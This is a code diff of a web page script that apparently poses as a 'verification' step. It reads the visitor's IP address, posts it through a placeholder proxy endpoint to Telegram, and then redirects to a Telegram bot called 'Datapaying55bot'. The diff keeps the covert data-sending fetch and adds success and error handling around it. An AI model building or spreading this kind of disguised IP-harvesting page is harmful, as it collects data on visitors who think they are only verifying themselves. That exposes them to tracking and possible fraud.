@@ -37,9 +37,9 @@
                 let ipData = await ipResponse.json();
                 let userIP = ipData.ip;
 
-                // Send data to Telegram through webhook (replace with your webhook URL)
-                let webhookURL = "https://your-backend.vercel.app/verify";
-                await fetch(webhookURL, {
+                // Telegram API request through a proxy
+                let proxyURL = "https://your-backend.vercel.app/verify";
+                let response = await fetch(proxyURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -48,9 +48,13 @@
                     })
                 });
 
-                // Redirect to Telegram bot
-                alert("✅ Verification successful! Redirecting...");
-                window.location.href = `https://t.me/Datapaying55bot?start=handleIP`;
+                let result = await response.json();
+                if (result.success) {
+                    alert("✅ Verification successful! Redirecting...");
+                    window.location.href = `https://t.me/Datapaying55bot?start=handleIP`;
+                } else {
+                    alert("❌ Verification failed: " + result.error);
+                }
 
             } catch (error) {
                 alert("❌ Error: Verification failed. Please try again.");
